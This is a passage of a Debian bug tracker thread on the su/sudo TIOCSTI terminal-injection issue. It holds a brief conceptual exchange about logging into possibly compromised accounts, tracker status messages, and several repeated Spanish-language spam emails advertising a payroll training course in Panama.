> In your case, if you're changing to an unprivileged user without a shell nor
> password, probably some sort of "locked" account, how is an attacker going
> to make use of TIOCSTI to exploit your system? (Assuming you're not going to
> run untrusted applications).
>
> Now imagine that that locked user got compromised. Changing to a compromised
> user IS and will ALWAYS be bad practice. So, if you don't know if the user
> is compromised or not, don't log into that account, as simple as that. All
> sorts of bad things can happen.

I see your point.

But there's always a trade-off between security and usability.
And logging in as a (possibly compromised) user makes working
with user separation much easier and should still be as secure as
possible (that's why I want to fix su and sudo). I know an
attacker could exploit my terminal emulator when I log in, but
it's better than no isolation at all IMHO.

Anyway, this is off-topic, so let's take this off-list if you
want to discuss it further.

Regards
Simon
--
+ privacy is necessary
+ using gnupg <http://gnupg.org>
+ public key id: 0x92FEFDB7E44C32F9

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=271) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sat, 22 Oct 2016 03:45:02 GMT) ([full text](bugreport.cgi?bug=628843;msg=273), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=273), [link](#272)).

---

**Acknowledgement sent**
to `Salomon Polanco <salomonpolanco@gmail.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 22 Oct 2016 03:45:02 GMT) ([full text](bugreport.cgi?bug=628843;msg=275), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=275), [link](#274)).

---

[Message #276](#276) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=276), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=276), reply):

![](/cgi-bin/libravatar.cgi?email=salomonpolanco%40gmail.com)
From: Salomon Polanco <salomonpolanco@gmail.com>
To: 628843@bugs.debian.org
Subject: Casual
Date: Fri, 21 Oct 2016 22:40:42 -0500
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=276) (text/plain, inline)]
```
```
Hola.

--
Atentamente

                  Salomón Polanco

```
```
[[Message part 2](bugreport.cgi?att=1;bug=628843;msg=276) (text/html, inline)]
```

---

**Added tag(s) confirmed.**
Request was from `Bálint Réczey <balint@balintreczey.hu>`
to `control@bugs.debian.org`.
(Fri, 20 Jan 2017 20:36:12 GMT) ([full text](bugreport.cgi?bug=628843;msg=278), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=278), [link](#277)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Fri, 23 Jun 2017 21:54:02 GMT) ([full text](bugreport.cgi?bug=628843;msg=280), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=280), [link](#279)).

---

**Acknowledgement sent**
to `"Soluciones Gerenciales ®" <boletin@soluciongerencial.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 23 Jun 2017 21:54:02 GMT) ([full text](bugreport.cgi?bug=628843;msg=282), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=282), [link](#281)).

---

[Message #283](#283) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=283), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=283), reply):

![](/cgi-bin/libravatar.cgi?email=boletin%40soluciongerencial.com)
From: "Soluciones Gerenciales ®" <boletin@soluciongerencial.com>
To: <628843@bugs.debian.org>
Subject: Certificación: Especialista en Planilla - Sipe en Línea - Planilla 100% Práctico. EL más completo y mejor de la Región
Date: Fri, 23 Jun 2017 23:35:22 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=283) (text/plain, inline)]
```
```

Boletin

								Soluciones Gerenciales le Invita a nuestra Certificación: Especialista en Planilla

											Teléfonos:507- 3985092 sino logra ser atendido puede llamar también al 507-8335786
											Marcar como SPAM

															Próximos Eventos

															Talleres Incompany

															Reservar en Panamá (Presencial)

											Certificación:

											Especialista en Planilla

														Obtén la herramientas necesarias para ser un especialista en planilla

		Contenido del Evento

									MODULO 1: INTENSIVO PARA PLANILLEROS
										Fecha: 21-07-2017 y 22-07-2017
Horario: 16 horas academicas (1:30 pm a 6:30 pm)
										Rose Molina

										Contenido:

										1. Concepto de salario para Mitradel, CSS

										2. Normas protectoras de Salario según el Código de trabajo

										3. Régimen de seguridad social

										4. El Contrato de Trabajo.

										5. Salario Mínimo.

										6. Descuentos y Retenciones permitidas sobre el salario.

										7. Incapacidades, Ausencias y Permisos.

										8. Calculo de Horas Extras

										9. Liquidaciones Laborales

										10. Introducción a SIPE

										Armando Avendaño

										Aplicación Correcta del código de Trabajo

										Contenido:

										1. La Relación De Trabajo.

										2. Los Sujetos De La Relación De Trabajo.

										3. El Contrato De Trabajo.

										3.1. Características Principales.

										-dependencia Económica.

										-subordinación Jurídica.

										4. Por qué debemos celebrar un contrato de trabajo.

										5. Tipos De Contratos.

										5.1. Contratos Definidos.

										5.2. Contratos Indefinidos.

										5.3. Contratos Por Obra.

										6. Formas De Contrato De Trabajo.

										6.1. Período Probatorio.

										6.2. La Movilidad, Elementos Esenciales.

										7. Contratistas y Sub-Contratistas.

										8. ¿Cuándo Se Requiere La Aprobación oficial de un contrato de trabajo?

										9. Causas De Terminación de la relación laboral

										10. Relación De Trabajo Vs Servicio Profesional.

										11. Derechos Y Obligaciones De Los trabajadores y empleadores.

										12. Las Sanciones Disciplinarias.

										13. Aplicación Para Terminar La Relación Laboral.

										13.1. Los Despidos.

										13.1.1. Injustificados.

										13.1.2. Justificados.

										13.1.2.1. Causas Justas De Despido.

										13.1.2.1.1. Disciplinarias.

										13.1.2.1.2. No Imputables.

										13.1.2.1.3. Económicas.

										13.2. Indemnización Y Reintegros.

										13.3. Cómo Redactar Una Carta De Despido.

										13.4. Estructura De La Notificación De Despido.

										14. Las Renuncias.

										14.1. Cómo Redactar Las Cartas De renuncia.

										15. El Mutuo Acuerdo.

										MODULO 2: PLANILLA 100% PRÁCTICO
										Fecha: 28-07-2017
Horario: 8:30 am a 1:30 pm

Requisitos: Llevar computador el día del Evento

										1.Calculo del salario
										a.Por hora
										b.Semanal
										c.Bisemanal
										d.Quincenal
										e.Mensual
										2.Descuentos y Retenciones permitidas sobre el salario.
										3.Pago de Incapacidades
										4.Descuento de Ausencias y Permisos.
										5.Calculo de Horas Extras
										6.Liquidaciones Laborales
										a.Tipos de despido
										b.Tipos de renuncia
										c.Calculo de vacaciones
										d.Cálculo del XIII mes
										e.Prima de antigüedad
										f.Preaviso
										i.De la empresa hacia el empleado
										ii.Del empleado hacia la empresa
										g.Indemnización

										MODULO 3: SIPE EN LíNEA - LA PLANILLA CáLCULO DE HORAS EXTRAS LIQUIDACIONES
										Fecha: 29-07-2017
Horario: 8:30 am a 1:30 pm

Objetivo General:

										1. Proveer al participante la información completa y el marco legal que sostienen los procedimientos y procesos de este sistema.

										2. Convertir al usuario en un experto en el uso del sistema, evitando así las inconsistencias, multas, cargos por ajustes de salarios mal posteados, recargos e intereses.

Contenido:

										1. Sistema de Ingresos y Prestaciones Económicas “SIPE”
										• Qué es el SIPE?
										• La firma Digital.
										• Creación de usuarios y bloqueo de los mismos
										• Grupo de empleados
										• El Aviso de Entrada
										• Licencias
										• Reportes del sistema
										• La afiliación Vs el aviso de entrada
										• Retiro de empleados• Reflejar la liquidación al momento del retiro de los empleados
										• Qué es el salario ajustado

										2. CONCEPTO DE SALARIO PARA SIPE
										Qué se considera salario para la Caja de Seguro Social.

3. Régimen tributario de la Caja de Seguro Social
										• Cuotas de empleados.
										• Cuotas de empleadores.
										• Contribución de las pensiones y jubilaciones.
										• Calculo oficial del Aviso de cobro o comprobante de ingresos

4. Problemas que generados en el sistema que usted puede resolver.

										5. Problemas generados en el sistema que son resueltos por la CSS.

										6. Planillas domésticas.

										7. Montaremos una planilla en tiempo real, durante la capacitación

										8. Preguntas y respuestas

										9. Manejo de la información importante LEY 51 de la CSS

		Facilitadores
								Especialista. Rose Molina
											Ingeniera Industrial Administrativa con Licenciatura en Profesorado de Segunda Enseñanza, IV año de Contabilidad y Diplomado en Gestión Tributaria, gerencia general y administrativa, contabilidad general, dirección de personal, entrenamiento de personal en temas dirigidos, dirección y planificación de obras y proyectos, mantenimiento de flotas, logística de transporte y movimiento de carga suelta y contener izada puerta a puerta. Administración de talleres de servicio.

											Abog. Armando Avendaño
											Abogado de La Universidad católica Santa Maria La Antigua, Postgrado en Derecho laboral, Abogado en gestión de procesos penales, asesorías laborales, trámites comerciales, administrativos.

		Evento en Panamá
					Fecha:  viernes 21 de julio de 2017 y sábado 29 de julio de 2017
					Lugar: Hotel El Panamá , Ciudad de Panamá

					24 horas académicas

					Precios en Panamá (NO INCLUYEN I.T.B.M.)
								Preventa I
												B/ Ver Precio
												Válido hasta el 06 de Julio

								Preventa II
												B/ Ver Precio
												Válido desde el 07 de Julio hasta el 13 de Julio

								Normal
												B/ Ver Precio
												Válido desde el 14 de Julio hasta el 20 de Julio

								Día del Evento
												B/ Ver Precio
												Válido desde el 21 de Julio hasta el 21 de Julio

								Carta de Compromiso
												B/ Ver Precio
												Para empresas que cancelen después del evento. Promociones NO APLICAN.

											Promociones

											PAGUE 2 Y LLEVE 3
																	PAGUE 4 Y LLEVE 6
																	PAGUE 6 Y LLEVE 10
																	PAGUE 12 Y LLEVE 20
																	25% DE DESCUENTO PARA ESTUDIANTES (Válido al enviar Carnet Vigente)

											El curso incluye

														Material de Apoyo
																Tarjeta de Membresía
																Coffee Break
																Certificado
																Hologram Sticker 3D (Validación de Certificado)

											Pague Online
											Realice su pago de forma online, con su tarjeta de credito VISA o MASTERCARD

											Incompany
											Lleve este Taller a Su Empresa (Modalidad INCOMPANY)

		Reserve sus cupos en el evento en Panamá GERENCIALES.COM

					Contacto
								Teléfonos:

									507- 3985084 sino logra ser atendido puede llamar también al 507-8335786

								Le hemos enviado este correo a usted, que forma parte de una élite de profesionales exitosos y emprendedores en búsqueda de Adiestramiento y Capacitación en diversas áreas empresariales, de vital importancia para el desenvolvimiento de las diferentes labores organizacionales de hoy en día. Si usted considera que esta información no es de su interés, haga clic aquí para Desuscribirse.

											Soluciones Gerenciales (Grupo Soluciones Gerenciales S.A, RUC: 1281637-1-600678). Marcar como SPAM.

```
```
[[Message part 2](bugreport.cgi?att=1;bug=628843;msg=283) (text/html, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Wed, 28 Jun 2017 18:45:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=285), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=285), [link](#284)).

---

**Acknowledgement sent**
to `"Soluciones Gerenciales ®" <boletin@soluciongerencial.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Wed, 28 Jun 2017 18:45:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=287), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=287), [link](#286)).

---

[Message #288](#288) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=288), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=288), reply):

![](/cgi-bin/libravatar.cgi?email=boletin%40soluciongerencial.com)
From: "Soluciones Gerenciales ®" <boletin@soluciongerencial.com>
To: <628843@bugs.debian.org>
Subject: Certificación: Especialista en Planilla - Sipe en Línea - Planilla 100% Práctico. EL más completo y mejor de la Región
Date: Wed, 28 Jun 2017 20:42:05 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=288) (text/plain, inline)]
```
```

Boletin

								Soluciones Gerenciales le Invita a nuestra Certificación: Especialista en Planilla

											Teléfonos:507- 3985092 sino logra ser atendido puede llamar también al 507-8335786
											Marcar como SPAM

															Próximos Eventos

															Talleres Incompany

															Reservar en Panamá (Presencial)

											Certificación:

											Especialista en Planilla

														Obtén la herramientas necesarias para ser un especialista en planilla

		Contenido del Evento

									MODULO 1: INTENSIVO PARA PLANILLEROS
										Fecha: 21-07-2017 y 22-07-2017
Horario: 16 horas academicas (1:30 pm a 6:30 pm)
										Rose Molina

										Contenido:

										1. Concepto de salario para Mitradel, CSS

										2. Normas protectoras de Salario según el Código de trabajo

										3. Régimen de seguridad social

										4. El Contrato de Trabajo.

										5. Salario Mínimo.

										6. Descuentos y Retenciones permitidas sobre el salario.

										7. Incapacidades, Ausencias y Permisos.

										8. Calculo de Horas Extras

										9. Liquidaciones Laborales

										10. Introducción a SIPE

										Armando Avendaño

										Aplicación Correcta del código de Trabajo

										Contenido:

										1. La Relación De Trabajo.

										2. Los Sujetos De La Relación De Trabajo.

										3. El Contrato De Trabajo.

										3.1. Características Principales.

										-dependencia Económica.

										-subordinación Jurídica.

										4. Por qué debemos celebrar un contrato de trabajo.

										5. Tipos De Contratos.

										5.1. Contratos Definidos.

										5.2. Contratos Indefinidos.

										5.3. Contratos Por Obra.

										6. Formas De Contrato De Trabajo.

										6.1. Período Probatorio.

										6.2. La Movilidad, Elementos Esenciales.

										7. Contratistas y Sub-Contratistas.

										8. ¿Cuándo Se Requiere La Aprobación oficial de un contrato de trabajo?

										9. Causas De Terminación de la relación laboral

										10. Relación De Trabajo Vs Servicio Profesional.

										11. Derechos Y Obligaciones De Los trabajadores y empleadores.

										12. Las Sanciones Disciplinarias.

										13. Aplicación Para Terminar La Relación Laboral.

										13.1. Los Despidos.

										13.1.1. Injustificados.

										13.1.2. Justificados.

										13.1.2.1. Causas Justas De Despido.

										13.1.2.1.1. Disciplinarias.

										13.1.2.1.2. No Imputables.

										13.1.2.1.3. Económicas.

										13.2. Indemnización Y Reintegros.

										13.3. Cómo Redactar Una Carta De Despido.

										13.4. Estructura De La Notificación De Despido.

										14. Las Renuncias.

										14.1. Cómo Redactar Las Cartas De renuncia.

										15. El Mutuo Acuerdo.

										MODULO 2: PLANILLA 100% PRÁCTICO
										Fecha: 28-07-2017
Horario: 8:30 am a 1:30 pm

Requisitos: Llevar computador el día del Evento

										1.Calculo del salario
										a.Por hora
										b.Semanal
										c.Bisemanal
										d.Quincenal
										e.Mensual
										2.Descuentos y Retenciones permitidas sobre el salario.
										3.Pago de Incapacidades
										4.Descuento de Ausencias y Permisos.
										5.Calculo de Horas Extras
										6.Liquidaciones Laborales
										a.Tipos de despido
										b.Tipos de renuncia
										c.Calculo de vacaciones
										d.Cálculo del XIII mes
										e.Prima de antigüedad
										f.Preaviso
										i.De la empresa hacia el empleado
										ii.Del empleado hacia la empresa
										g.Indemnización

										MODULO 3: SIPE EN LíNEA - LA PLANILLA CáLCULO DE HORAS EXTRAS LIQUIDACIONES
										Fecha: 29-07-2017
Horario: 8:30 am a 1:30 pm

Objetivo General:

										1. Proveer al participante la información completa y el marco legal que sostienen los procedimientos y procesos de este sistema.

										2. Convertir al usuario en un experto en el uso del sistema, evitando así las inconsistencias, multas, cargos por ajustes de salarios mal posteados, recargos e intereses.

Contenido:

										1. Sistema de Ingresos y Prestaciones Económicas “SIPE”
										• Qué es el SIPE?
										• La firma Digital.
										• Creación de usuarios y bloqueo de los mismos
										• Grupo de empleados
										• El Aviso de Entrada
										• Licencias
										• Reportes del sistema
										• La afiliación Vs el aviso de entrada
										• Retiro de empleados• Reflejar la liquidación al momento del retiro de los empleados
										• Qué es el salario ajustado

										2. CONCEPTO DE SALARIO PARA SIPE
										Qué se considera salario para la Caja de Seguro Social.

3. Régimen tributario de la Caja de Seguro Social
										• Cuotas de empleados.
										• Cuotas de empleadores.
										• Contribución de las pensiones y jubilaciones.
										• Calculo oficial del Aviso de cobro o comprobante de ingresos

4. Problemas que generados en el sistema que usted puede resolver.

										5. Problemas generados en el sistema que son resueltos por la CSS.

										6. Planillas domésticas.

										7. Montaremos una planilla en tiempo real, durante la capacitación

										8. Preguntas y respuestas

										9. Manejo de la información importante LEY 51 de la CSS

		Facilitadores
								Especialista. Rose Molina
											Ingeniera Industrial Administrativa con Licenciatura en Profesorado de Segunda Enseñanza, IV año de Contabilidad y Diplomado en Gestión Tributaria, gerencia general y administrativa, contabilidad general, dirección de personal, entrenamiento de personal en temas dirigidos, dirección y planificación de obras y proyectos, mantenimiento de flotas, logística de transporte y movimiento de carga suelta y contener izada puerta a puerta. Administración de talleres de servicio.

											Abog. Armando Avendaño
											Abogado de La Universidad católica Santa Maria La Antigua, Postgrado en Derecho laboral, Abogado en gestión de procesos penales, asesorías laborales, trámites comerciales, administrativos.

		Evento en Panamá
					Fecha:  viernes 21 de julio de 2017 y sábado 29 de julio de 2017
					Lugar: Hotel El Panamá , Ciudad de Panamá

					24 horas académicas

					Precios en Panamá (NO INCLUYEN I.T.B.M.)
								Preventa I
												B/ Ver Precio
												Válido hasta el 06 de Julio

								Preventa II
												B/ Ver Precio
												Válido desde el 07 de Julio hasta el 13 de Julio

								Normal
												B/ Ver Precio
												Válido desde el 14 de Julio hasta el 20 de Julio

								Día del Evento
												B/ Ver Precio
												Válido desde el 21 de Julio hasta el 21 de Julio

								Carta de Compromiso
												B/ Ver Precio
												Para empresas que cancelen después del evento. Promociones NO APLICAN.

											Promociones

											PAGUE 2 Y LLEVE 3
																	PAGUE 4 Y LLEVE 6
																	PAGUE 6 Y LLEVE 10
																	PAGUE 12 Y LLEVE 20
																	25% DE DESCUENTO PARA ESTUDIANTES (Válido al enviar Carnet Vigente)

											El curso incluye

														Material de Apoyo
																Tarjeta de Membresía
																Coffee Break
																Certificado
																Hologram Sticker 3D (Validación de Certificado)

											Pague Online
											Realice su pago de forma online, con su tarjeta de credito VISA o MASTERCARD

											Incompany
											Lleve este Taller a Su Empresa (Modalidad INCOMPANY)

		Reserve sus cupos en el evento en Panamá GERENCIALES.COM

					Contacto
								Teléfonos:

									507- 3985084 sino logra ser atendido puede llamar también al 507-8335786

								Le hemos enviado este correo a usted, que forma parte de una élite de profesionales exitosos y emprendedores en búsqueda de Adiestramiento y Capacitación en diversas áreas empresariales, de vital importancia para el desenvolvimiento de las diferentes labores organizacionales de hoy en día. Si usted considera que esta información no es de su interés, haga clic aquí para Desuscribirse.

											Soluciones Gerenciales (Grupo Soluciones Gerenciales S.A, RUC: 1281637-1-600678). Marcar como SPAM.

```
```
[[Message part 2](bugreport.cgi?att=1;bug=628843;msg=288) (text/html, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 17 Jul 2017 21:33:06 GMT) ([full text](bugreport.cgi?bug=628843;msg=290), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=290), [link](#289)).

---

**Acknowledgement sent**
to `"Soluciones Gerenciales ®" <boletin@soluciongerencial.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 17 Jul 2017 21:33:06 GMT) ([full text](bugreport.cgi?bug=628843;msg=292), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=292), [link](#291)).

---

[Message #293](#293) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=293), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=293), reply):

![](/cgi-bin/libravatar.cgi?email=boletin%40soluciongerencial.com)
From: "Soluciones Gerenciales ®" <boletin@soluciongerencial.com>
To: <628843@bugs.debian.org>
Subject: Certificación: Especialista en Planilla - Sipe en Línea - Planilla 100% Práctico. EL más completo y mejor de la Región
Date: Mon, 17 Jul 2017 23:29:00 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=293) (text/plain, inline)]
```
```

Boletin

								Soluciones Gerenciales le Invita a nuestra Certificación: Especialista en Planilla

											Teléfonos:507- 3985092 sino logra ser atendido puede llamar también al 507-8335786
											Marcar como SPAM

															Próximos Eventos

															Talleres Incompany

															Reservar en Panamá (Presencial)

											Certificación:

											Especialista en Planilla

														Obtén la herramientas necesarias para ser un especialista en planilla

		Contenido del Evento

									MODULO 1: INTENSIVO PARA PLANILLEROS
										Fecha: 21-07-2017 y 22-07-2017
Horario: 16 horas academicas (1:30 pm a 6:30 pm)
										Rose Molina

										Contenido:

										1. Concepto de salario para Mitradel, CSS

										2. Normas protectoras de Salario según el Código de trabajo

										3. Régimen de seguridad social

										4. El Contrato de Trabajo.

										5. Salario Mínimo.

										6. Descuentos y Retenciones permitidas sobre el salario.

										7. Incapacidades, Ausencias y Permisos.

										8. Calculo de Horas Extras

										9. Liquidaciones Laborales

										10. Introducción a SIPE

										Armando Avendaño

										Aplicación Correcta del código de Trabajo

										Contenido:

										1. La Relación De Trabajo.

										2. Los Sujetos De La Relación De Trabajo.

										3. El Contrato De Trabajo.

										3.1. Características Principales.

										-dependencia Económica.

										-subordinación Jurídica.

										4. Por qué debemos celebrar un contrato de trabajo.

										5. Tipos De Contratos.

										5.1. Contratos Definidos.

										5.2. Contratos Indefinidos.

										5.3. Contratos Por Obra.

										6. Formas De Contrato De Trabajo.

										6.1. Período Probatorio.

										6.2. La Movilidad, Elementos Esenciales.

										7. Contratistas y Sub-Contratistas.

										8. ¿Cuándo Se Requiere La Aprobación oficial de un contrato de trabajo?

										9. Causas De Terminación de la relación laboral

										10. Relación De Trabajo Vs Servicio Profesional.

										11. Derechos Y Obligaciones De Los trabajadores y empleadores.

										12. Las Sanciones Disciplinarias.

										13. Aplicación Para Terminar La Relación Laboral.

										13.1. Los Despidos.

										13.1.1. Injustificados.

										13.1.2. Justificados.

										13.1.2.1. Causas Justas De Despido.

										13.1.2.1.1. Disciplinarias.

										13.1.2.1.2. No Imputables.

										13.1.2.1.3. Económicas.

										13.2. Indemnización Y Reintegros.

										13.3. Cómo Redactar Una Carta De Despido.

										13.4. Estructura De La Notificación De Despido.

										14. Las Renuncias.

										14.1. Cómo Redactar Las Cartas De renuncia.

										15. El Mutuo Acuerdo.

										MODULO 2: PLANILLA 100% PRÁCTICO
										Fecha: 28-07-2017
Horario: 8:30 am a 1:30 pm

Requisitos: Llevar computador el día del Evento

										1.Calculo del salario
										a.Por hora
										b.Semanal
										c.Bisemanal
										d.Quincenal
										e.Mensual
										2.Descuentos y Retenciones permitidas sobre el salario.
										3.Pago de Incapacidades
										4.Descuento de Ausencias y Permisos.
										5.Calculo de Horas Extras
										6.Liquidaciones Laborales
										a.Tipos de despido
										b.Tipos de renuncia
										c.Calculo de vacaciones
										d.Cálculo del XIII mes
										e.Prima de antigüedad
										f.Preaviso
										i.De la empresa hacia el empleado
										ii.Del empleado hacia la empresa
										g.Indemnización

										MODULO 3: SIPE EN LíNEA - LA PLANILLA CáLCULO DE HORAS EXTRAS LIQUIDACIONES
										Fecha: 29-07-2017
Horario: 8:30 am a 1:30 pm

Objetivo General:

										1. Proveer al participante la información completa y el marco legal que sostienen los procedimientos y procesos de este sistema.

										2. Convertir al usuario en un experto en el uso del sistema, evitando así las inconsistencias, multas, cargos por ajustes de salarios mal posteados, recargos e intereses.

Contenido:

										1. Sistema de Ingresos y Prestaciones Económicas “SIPE”
										• Qué es el SIPE?
										• La firma Digital.
										• Creación de usuarios y bloqueo de los mismos
										• Grupo de empleados
										• El Aviso de Entrada
										• Licencias
										• Reportes del sistema
										• La afiliación Vs el aviso de entrada
										• Retiro de empleados• Reflejar la liquidación al momento del retiro de los empleados
										• Qué es el salario ajustado

										2. CONCEPTO DE SALARIO PARA SIPE
										Qué se considera salario para la Caja de Seguro Social.

3. Régimen tributario de la Caja de Seguro Social
										• Cuotas de empleados.
										• Cuotas de empleadores.
										• Contribución de las pensiones y jubilaciones.
										• Calculo oficial del Aviso de cobro o comprobante de ingresos

4. Problemas que generados en el sistema que usted puede resolver.

										5. Problemas generados en el sistema que son resueltos por la CSS.

										6. Planillas domésticas.

										7. Montaremos una planilla en tiempo real, durante la capacitación

										8. Preguntas y respuestas

										9. Manejo de la información importante LEY 51 de la CSS

		Facilitadores
								Especialista. Rose Molina
											Ingeniera Industrial Administrativa con Licenciatura en Profesorado de Segunda Enseñanza, IV año de Contabilidad y Diplomado en Gestión Tributaria, gerencia general y administrativa, contabilidad general, dirección de personal, entrenamiento de personal en temas dirigidos, dirección y planificación de obras y proyectos, mantenimiento de flotas, logística de transporte y movimiento de carga suelta y contener izada puerta a puerta. Administración de talleres de servicio.

											Abog. Armando Avendaño
											Abogado de La Universidad católica Santa Maria La Antigua, Postgrado en Derecho laboral, Abogado en gestión de procesos penales, asesorías laborales, trámites comerciales, administrativos.

		Evento en Panamá
					Fecha:  viernes 21 de julio de 2017 y sábado 29 de julio de 2017
					Lugar: Hotel El Panamá , Ciudad de Panamá

					24 horas académicas

					Precios en Panamá (NO INCLUYEN I.T.B.M.)
								Preventa I
												B/ Ver Precio
												Válido hasta el 06 de Julio

								Preventa II
												B/ Ver Precio
												Válido desde el 07 de Julio hasta el 13 de Julio

								Normal
												B/ Ver Precio
												Válido desde el 14 de Julio hasta el 20 de Julio

								Día del Evento
												B/ Ver Precio
												Válido desde el 21 de Julio hasta el 21 de Julio

								Carta de Compromiso
												B/ Ver Precio
												Para empresas que cancelen después del evento. Promociones NO APLICAN.

											Promociones

											PAGUE 2 Y LLEVE 3
																	PAGUE 4 Y LLEVE 6
																	PAGUE 6 Y LLEVE 10
																	PAGUE 12 Y LLEVE 20
																	25% DE DESCUENTO PARA ESTUDIANTES (Válido al enviar Carnet Vigente)

											El curso incluye

														Material de Apoyo
																Tarjeta de Membresía
																Coffee Break
																Certificado
																Hologram Sticker 3D (Validación de Certificado)

											Pague Online
											Realice su pago de forma online, con su tarjeta de credito VISA o MASTERCARD

											Incompany
											Lleve este Taller a Su Empresa (Modalidad INCOMPANY)

		Reserve sus cupos en el evento en Panamá GERENCIALES.COM

					Contacto
								Teléfonos:

									507- 3985084 sino logra ser atendido puede llamar también al 507-8335786

								Le hemos enviado este correo a usted, que forma parte de una élite de profesionales exitosos y emprendedores en búsqueda de Adiestramiento y Capacitación en diversas áreas empresariales, de vital importancia para el desenvolvimiento de las diferentes labores organizacionales de hoy en día. Si usted considera que esta información no es de su interés, haga clic aquí para Desuscribirse.

											Soluciones Gerenciales (Grupo Soluciones Gerenciales S.A, RUC: 1281637-1-600678). Marcar como SPAM.

```
```
[[Message part 2](bugreport.cgi?att=1;bug=628843;msg=293) (text/html, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Thu, 30 Nov 2017 04:51:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=295), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=295), [link](#294)).

---

**Acknowledgement sent**
to `"Soluciones Gerenciales" <boletin@soluciongerencial.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 30 Nov 2017 04:51:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=297), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=297), [link](#296)).

---

[Message #298](#298) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=298), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=298), reply):

![](/cgi-bin/libravatar.cgi?email=boletin%40soluciongerencial.com)
From: "Soluciones Gerenciales" <boletin@soluciongerencial.com>
To: 628843@bugs.debian.org
Subject: Auditoría Masiva DGI ¿Se encuentra su empresa preparada para resistirla?
Date: Thu, 30 Nov 2017 00:44:03 -0400
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=298) (text/plain, inline)]
```
```

			Si no ve este corr= eo, haga [click aqui](3D'[http://seg.publicidadpersonal.com/public/correo_detalle=](http://seg.publicidadpersonal.com/public/correo_detalle%3D)) 			No quiero recibir mas este correo (Unsubscribe)= --> 		 			Co= mpartir este correo  			 [](3D'[http://seg.publicidadpersonal.com/public/correo_detalle.=](http://seg.publicidadpersonal.com/public/correo_detalle.%3D))

hola

			[](3D'[http://www.tuloenvias.com.ve/'](http://www.tuloenvias.com.ve/%27)) Este correo fue enviado por Soluciones Geren= ciales (j312255749) a traves de TuLoEnvias.com= ong>
			 		Su correo se encuentra registrado en la base de datos de Soluciones G= erenciales, si usted no desea seguir recibiendo este correo, por favor haga= click en retirar de la lista y no recibira mas correos de esta empr= esa, o actualice su informacion para mejorar nuestra segmentaci&oacu= te;n y envio de correos.
		[Actualizar mi informacion](3D'[http://seg.publicidadpersonal.com/public/proceso_redirect.=](http://seg.publicidadpersonal.com/public/proceso_redirect.%3D)) | [Retirar de la lista (Unsubscribe)](3D'ht=)

```
```
[[Message part 2](bugreport.cgi?att=1;bug=628843;msg=298) (text/html, inline)]
```

---

**Bug reassigned from package '[login](pkgreport.cgi?package=login)' to '[util-linux](pkgreport.cgi?package=util-linux)'.**
Request was from `Chris Hofstaedtler <zeha@debian.org>`
to `control@bugs.debian.org`.
(Wed, 08 Aug 2018 19:48:02 GMT) ([full text](bugreport.cgi?bug=628843;msg=300), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=300), [link](#299)).

---

**No longer marked as found in versions shadow/1:4.2-3+deb8u1 and shadow/1:4.1.4.2+svn3283-1.**
Request was from `Chris Hofstaedtler <zeha@debian.org>`
to `control@bugs.debian.org`.
(Wed, 08 Aug 2018 19:48:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=302), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=302), [link](#301)).

---

**Information stored**
:

`Bug#628843`; Package `util-linux`.
